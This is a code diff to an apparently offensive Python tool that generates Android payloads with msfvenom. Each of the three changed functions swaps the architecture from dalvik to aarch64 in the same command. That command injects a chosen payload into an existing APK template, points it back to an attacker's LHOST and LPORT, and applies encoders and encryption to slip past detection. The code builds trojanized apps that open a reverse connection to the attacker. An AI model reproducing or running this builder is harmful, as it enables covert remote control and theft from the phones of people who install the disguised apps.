@@ -373,7 +373,7 @@ def msfvenom_x():
     os.system('clear')
     print('creating payload with the given information this will take some time, Plz be patient')
 
-    os.system('msfvenom -b --arch dalvik --platform android -x ' + str(loc) + ' -p ' + str(p) + ' LHOST=' + str(
+    os.system('msfvenom -b --arch aarch64 --platform android -x ' + str(loc) + ' -p ' + str(p) + ' LHOST=' + str(
         ip) + ' LPORT=' + str(port) + ' --encoder ' + str(e) + ' -i ' + str(iterate) + ' -o ' + str(
         os.getcwd()) + '/payload-apps/' + str(output))
     print(Fore.RED,
@@ -395,7 +395,7 @@ def msfvenom_p():
     os.system('clear')
     print('creating payload with the given information this will take some time, Plz be patient')
 
-    os.system('msfvenom --arch dalvik --platform android -p ' + str(pa) + ' LHOST=' + str(ipf) + ' LPORT=' + str(
+    os.system('msfvenom --arch aarch64 --platform android -p ' + str(pa) + ' LHOST=' + str(ipf) + ' LPORT=' + str(
         portf) + ' --encoder ' + str(e) + ' -i ' + str(iteratef) + ' -o ' + str(os.getcwd()) + '/payload-apps/' + str(
         outputf))
 
@@ -417,7 +417,7 @@ def msfvenom_encrypt():
     os.system('clear')
     print('creating payload with the given information this will take some time, Plz be patient')
 
-    os.system('msfvenom -b --arch dalvik --platform android -x ' + str(loc) + ' -p ' + str(p) + ' LHOST=' + str(
+    os.system('msfvenom -b --arch aarch64 --platform android -x ' + str(loc) + ' -p ' + str(p) + ' LHOST=' + str(
         ip) + ' LPORT=' + str(port) + ' --encoder ' + str(e) + ' --encrypt ' + str(enc) + ' -i ' + str(
         iterate) + ' -o ' + str(
         os.getcwd()) + '/payload-apps/' + str(output))
